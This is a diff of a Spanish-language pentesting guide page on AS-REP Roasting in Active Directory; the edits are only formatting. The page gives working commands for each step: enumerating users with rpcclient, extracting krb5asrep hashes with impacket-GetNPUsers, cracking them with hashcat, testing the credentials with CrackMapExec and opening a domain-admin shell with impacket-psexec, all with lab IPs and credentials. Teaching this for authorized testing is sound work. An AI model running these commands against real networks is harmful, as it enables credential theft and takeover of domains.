@@ -21,7 +21,7 @@ Este ataque está relacionado a las [malas prácticas](https://ajcruz15.gitbook.
 
 Vamos a explotar el siguiente esquema.
 
-En una red empresarial no hemos conseguido acceso a ningún activo por ahora, sin embargo, tenemos unos credenciales de usuario sin privilegios \(vgarcia:Password2\). Como parte de nuestra rutina tratamos de explotar un AS\_REP Roasting.
+En una red empresarial no hemos conseguido acceso a ningún activo por ahora, sin embargo, tenemos unos credenciales de usuario sin privilegios (vgarcia:Password2). Como parte de nuestra rutina tratamos de explotar un AS\_REP Roasting.
 
 {% hint style="info" %}
 La base de este ataque está en usuarios que tengan activa la Opción "No requiere preautenticación de Kerberos". Esto hace que el protocolo Kerberos expida un Ticket-Granting Ticket en nombre de dicho usuario sin comprobar su identidad.
@@ -33,7 +33,9 @@ Por tanto, tenemos el Hash krb5asrep del usuario que podemos crackear facilmente
 
 Para entender más en profundidad estos conceptos puede leer el siguiente artículo:
 
-{% page-ref page="../conceptos/conceptos-importantes-antes-de-continuar.md" %}
+{% content-ref url="../conceptos/conceptos-importantes-antes-de-continuar.md" %}
+[conceptos-importantes-antes-de-continuar.md](../conceptos/conceptos-importantes-antes-de-continuar.md)
+{% endcontent-ref %}
 
 ### Herramientas necesarias
 
@@ -41,15 +43,15 @@ Para entender más en profundidad estos conceptos puede leer el siguiente artíc
 
 Herramienta para ejecutar el cliente de MS-RPC. Viene instalada por defecto en Linux.
 
-{% embed url="https://web.mit.edu/darwin/src/modules/samba/docs/htmldocs/rpcclient.1.html" caption="" %}
+{% embed url="https://web.mit.edu/darwin/src/modules/samba/docs/htmldocs/rpcclient.1.html" %}
 
-#### CrackMapExec <a id="crackmapexec"></a>
+#### CrackMapExec <a href="#crackmapexec" id="crackmapexec"></a>
 
 Es una herramienta de post-explotación que se aprovecha de protocolos y características propias de los entornos de Directorio Activo para obtener una gran cantidad de información sobre los mismos.
 
 Utiliza **Impacket** y **Powersploit Toolkit**
 
-{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" caption="" %}
+{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}
 
 #### **Impacket**
 
@@ -57,19 +59,19 @@ Es una colección de clases de Python para trabajar con protocolos de red. Está
 
 Concretamente para este ataque vamos a utilizar **impacket-GetNPUsers**
 
-{% embed url="https://github.com/SecureAuthCorp/impacket" caption="" %}
+{% embed url="https://github.com/SecureAuthCorp/impacket" %}
 
-#### PowerSploit Toolkit <a id="powersploit-toolkit"></a>
+#### PowerSploit Toolkit <a href="#powersploit-toolkit" id="powersploit-toolkit"></a>
 
 Es una colección de scripts de Powershell orientados a ayudar a pentesters en su proceso. Éste repositorio se encuentra deprecated.
 
-{% embed url="https://github.com/PowerShellMafia/PowerSploit" caption="" %}
+{% embed url="https://github.com/PowerShellMafia/PowerSploit" %}
 
-#### Hashcat <a id="hashcat"></a>
+#### Hashcat <a href="#hashcat" id="hashcat"></a>
 
 Es el crackeador de hashes más rápido del mundo actualmente. Puede aprovecharse de la pontecia de una GPU.
 
-{% embed url="https://github.com/hashcat/hashcat" caption="" %}
+{% embed url="https://github.com/hashcat/hashcat" %}
 
 #### **Resumen**
 
@@ -88,9 +90,9 @@ Con **rpcclient** podemos enumerar los usuarios del AD facilmente:
 
 `rpcclient -U "vgarcia" -W hackpoc 192.168.1.100 -c enumdomusers`
 
-![Obteniendo los usuarios de un Dominio.](../../.gitbook/assets/as_rep1.png)
+![Obteniendo los usuarios de un Dominio.](../../.gitbook/assets/as\_rep1.png)
 
-Los guardamos en un archivo users.txt \(Para acelerar el proceso podemos utilizar el siguiente oneliner:
+Los guardamos en un archivo users.txt (Para acelerar el proceso podemos utilizar el siguiente oneliner:
 
 `echo "Copiamos la salida del comando anterior" | grep '\[.*?\]' | grep -v '0x' | tr -d '[]'`
 
@@ -98,16 +100,16 @@ Una vez lo tenemos almacenados utilizamos impacket-GetNPUsers para comprobar cua
 
 `impacket-GetNPUsers hackpoc/ -usersfile users.txt -format hashcat -outputfile as_rep.txt`
 
-![Hash krb5asrep conseguido](../../.gitbook/assets/as_rep2%20%282%29%20%281%29.png)
+![Hash krb5asrep conseguido](<../../.gitbook/assets/as\_rep2 (2).png>)
 
 ### 2. Crackear el Hash
 
-A continuación tratamos de crackear el Hash utilizando Hashcat \(aunque tambien se puede utilizar john\).
+A continuación tratamos de crackear el Hash utilizando Hashcat (aunque tambien se puede utilizar john).
 
-1. Para averiguar el modo en el que trabaja hashcat con estos hashes sacamos: `hashcat --example-hashes | grep "krb5asrep" -B 2` 
+1. Para averiguar el modo en el que trabaja hashcat con estos hashes sacamos: `hashcat --example-hashes | grep "krb5asrep" -B 2`&#x20;
 2. Utilizamos hashcat para crackear el hash. `hashcat -m 18200 -a 0 as_rep.txt /usr/share/wordlists/rockyou.txt`
 
-![Contrase&#xF1;a crackeada SVC-SQLService:MYpassword123\#](../../.gitbook/assets/as_rep3.png)
+![Contraseña crackeada SVC-SQLService:MYpassword123#](../../.gitbook/assets/as\_rep3.png)
 
 ### 3. Comprobar alcance de credenciales
 
@@ -115,7 +117,7 @@ Utilizamos CrackMapExec para comprobar si los credenciales obtenidos tienen capa
 
 `cme smb 192.168.1.0/24 -u "SVC-SQLService" -p "MYpassword123#"`
 
-![El usuario SVC-SQLService es administrador de dominio &#xA1;Premio!](../../.gitbook/assets/as_rep4.png)
+![El usuario SVC-SQLService es administrador de dominio ¡Premio!](../../.gitbook/assets/as\_rep4.png)
 
 ### 4. shell interactiva con el DC
 
@@ -123,9 +125,8 @@ El usuario que hemos obtenido es un usuario administrador de dominio por lo que 
 
 `impacket-psexec hackpoc/SVC-SQLService:MYpassword123#@192.168.1.100 cmd.exe`
 
-![&#xA1;Premio!](../../.gitbook/assets/imagen%20%2883%29.png)
+![¡Premio!](<../../.gitbook/assets/imagen (75).png>)
 
 ## REFERENCIAS
 
-{% embed url="https://en.hackndo.com/kerberos-asrep-roasting/%0Ahttps://www.youtube.com/watch?v=KYFlvFfh-Js&list=PLlb2ZjHtNkpg2Mc3mbkdYAhEoqnMGdl2Z&index=2" caption="" %}
-
+{% embed url="https://en.hackndo.com/kerberos-asrep-roasting/%0Ahttps://www.youtube.com/watch?v=KYFlvFfh-Js&list=PLlb2ZjHtNkpg2Mc3mbkdYAhEoqnMGdl2Z&index=2" %}
